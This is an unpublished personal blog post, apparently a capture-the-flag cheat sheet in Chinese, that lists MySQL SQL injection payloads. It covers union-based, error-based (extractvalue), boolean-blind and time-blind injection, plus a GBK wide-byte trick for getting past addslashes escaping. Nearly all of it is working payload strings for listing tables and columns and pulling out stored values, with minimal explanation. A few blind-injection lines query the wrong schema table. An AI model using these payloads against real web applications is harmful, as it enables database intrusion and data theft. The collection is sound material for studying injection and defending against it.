---
layout: post
title: 2025-07-09-sqli
subtitle: 2025-07-09-sqli
date: 2025-07-09 14:58
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
published: false
---
#### 联合查询

```mysql
-- 获取table
union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+
-- 获取column
union select database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'--+
-- or
union select database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c6167--+
-- 获取表中值
union select database(),group_concat(flag) from flag--+
```
#### 报错查询

```mysql
# 获取数据库名
and extractvalue(1,concat(0x7e,database()))--+
# 获取表名
and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
# 获取列名
and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag')))--+
# 获取字段值
and extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,30)))--+
```
#### 布尔盲注

```mysql
# 猜数据库名长度
1 and length(database())=100--+
# 猜数据库字符值
1 and ascii(substr(database(),1,1))=100--+
# 猜表数量
1 and (select count(table_name) from information_schema.tables where table_schema=database())=100--+
# 猜表长度
1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=100--+
# 猜表字段
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=100--+
# 猜列数量
1 and (select count(column_name) from information_schema.tables where table_schema=database() and table_name='flag')=100--+
# 猜列长度
1 and length((select count(column_name) from information_schema.tables where table_schema=database() and table_name='flag' limit 0,1))=100--+
# 猜列字段
1 and ascii(substr((select count(column_name) from information_schema.tables where table_schema=database() and table_name='flag' limit 0,1),1,1))=100--+
# 猜数据值数量
1 and (select count(flag) from flag)=100--+
```
#### 时间盲注

```mysql
# 猜数据库名长度
1 and if(length(database())=100,sleep(3),0)--+
```
#### 宽字节注入


使用条件：
编码格式：GBK, GBK2312等
过滤函数：mysql_real_escape_string, addslashes等

原理：为绕过转义处理，使转义字符与输入字符结合成一个新的字符，使其无法转义

```mysql
'1%df' or 1=1 #

# 16进制ASCII
'-1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273 --+
# group by
'-1%df' union select 1,table_name,group_concat(column_name) from information_schema.columns where table_schema=database() group by table_name limit 3,1 --+
```